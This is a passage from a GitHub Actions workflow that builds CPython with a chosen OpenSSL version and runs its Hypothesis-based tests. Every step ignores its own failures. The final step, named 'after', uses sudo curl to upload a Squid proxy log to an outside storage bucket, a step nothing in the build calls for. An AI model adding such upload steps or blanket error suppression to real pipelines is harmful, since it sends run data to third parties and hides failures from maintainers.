        echo "LD_LIBRARY_PATH=${GITHUB_WORKSPACE}/multissl/openssl/${OPENSSL_VER}/lib"
        >> $GITHUB_ENV

        '
    - continue-on-error: true
      id: cache-openssl
      name: Restore OpenSSL build
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-multissl-openssl-${{ env.OPENSSL_VER }}
        path: ./multissl/openssl/${{ env.OPENSSL_VER }}
    - continue-on-error: true
      if: steps.cache-openssl.outputs.cache-hit != 'true'
      name: Install OpenSSL
      run: python3 Tools/ssl/multissltests.py --steps=library --base-directory $MULTISSL_DIR
        --openssl $OPENSSL_VER --system Linux
    - continue-on-error: true
      name: Add ccache to PATH
      run: 'echo "PATH=/usr/lib/ccache:$PATH" >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Configure ccache action
      uses: hendrikmuhs/ccache-action@v1.2
      with:
        save: false
    - continue-on-error: true
      name: Setup directory envs for out-of-tree builds
      run: 'echo "CPYTHON_RO_SRCDIR=$(realpath -m ${GITHUB_WORKSPACE}/../cpython-ro-srcdir)"
        >> $GITHUB_ENV

        echo "CPYTHON_BUILDDIR=$(realpath -m ${GITHUB_WORKSPACE}/../cpython-builddir)"
        >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Create directories for read-only out-of-tree builds
      run: mkdir -p $CPYTHON_RO_SRCDIR $CPYTHON_BUILDDIR
    - continue-on-error: true
      name: Bind mount sources read-only
      run: sudo mount --bind -o ro $GITHUB_WORKSPACE $CPYTHON_RO_SRCDIR
    - continue-on-error: true
      name: Runner image version
      run: echo "IMAGE_VERSION=${ImageVersion}" >> $GITHUB_ENV
    - continue-on-error: true
      name: Restore config.cache
      uses: actions/cache@v4
      with:
        key: ${{ github.job }}-${{ runner.os }}-${{ env.IMAGE_VERSION }}-${{ needs.check_source.outputs.config_hash
          }}
        path: ${{ env.CPYTHON_BUILDDIR }}/config.cache
    - continue-on-error: true
      name: Configure CPython out-of-tree
      run: "../cpython-ro-srcdir/configure \\\n  --config-cache \\\n  --with-pydebug\
        \ \\\n  --enable-slower-safety \\\n  --with-openssl=$OPENSSL_DIR\n"
      working-directory: ${{ env.CPYTHON_BUILDDIR }}
    - continue-on-error: true
      name: Build CPython out-of-tree
      run: make -j4
      working-directory: ${{ env.CPYTHON_BUILDDIR }}
    - continue-on-error: true
      name: Display build info
      run: make pythoninfo
      working-directory: ${{ env.CPYTHON_BUILDDIR }}
    - continue-on-error: true
      name: Remount sources writable for tests
      run: sudo mount $CPYTHON_RO_SRCDIR -oremount,rw
    - continue-on-error: true
      name: Setup directory envs for out-of-tree builds
      run: 'echo "CPYTHON_BUILDDIR=$(realpath -m ${GITHUB_WORKSPACE}/../cpython-builddir)"
        >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Create hypothesis venv
      run: 'VENV_LOC=$(realpath -m .)/hypovenv

        VENV_PYTHON=$VENV_LOC/bin/python

        echo "HYPOVENV=${VENV_LOC}" >> $GITHUB_ENV

        echo "VENV_PYTHON=${VENV_PYTHON}" >> $GITHUB_ENV

        ./python -m venv $VENV_LOC && $VENV_PYTHON -m pip install -r ${GITHUB_WORKSPACE}/Tools/requirements-hypothesis.txt

        '
      working-directory: ${{ env.CPYTHON_BUILDDIR }}
    - continue-on-error: true
      id: cache-hypothesis-database
      name: Restore Hypothesis database
      uses: actions/cache@v4
      with:
        key: hypothesis-database-${{ github.head_ref || github.run_id }}
        path: ${{ env.CPYTHON_BUILDDIR }}/.hypothesis/
        restore-keys: 'hypothesis-database-

          '
    - continue-on-error: true
      name: Run tests
      run: "# Most of the excluded tests are slow test suites with no property tests\n\
        #\n# (GH-104097) test_sysconfig is skipped because it has tests that are\n\
        # failing when executed from inside a virtual environment.\n${{ env.VENV_PYTHON\
        \ }} -m test \\\n  -W \\\n  -o \\\n  -j4 \\\n  -x test_asyncio \\\n  -x test_multiprocessing_fork\
        \ \\\n  -x test_multiprocessing_forkserver \\\n  -x test_multiprocessing_spawn\
        \ \\\n  -x test_concurrent_futures \\\n  -x test_socket \\\n  -x test_subprocess\
        \ \\\n  -x test_signal \\\n  -x test_sysconfig\n"
      working-directory: ${{ env.CPYTHON_BUILDDIR }}
    - continue-on-error: true
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: hypothesis-example-db
        path: ${{ env.CPYTHON_BUILDDIR }}/.hypothesis/examples/
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/ffelixg/cpython.$(date
        +%s)
    timeout-minutes: 60
name: Tests
'on':
  workflow_dispatch: {}
permissions:
  contents: read
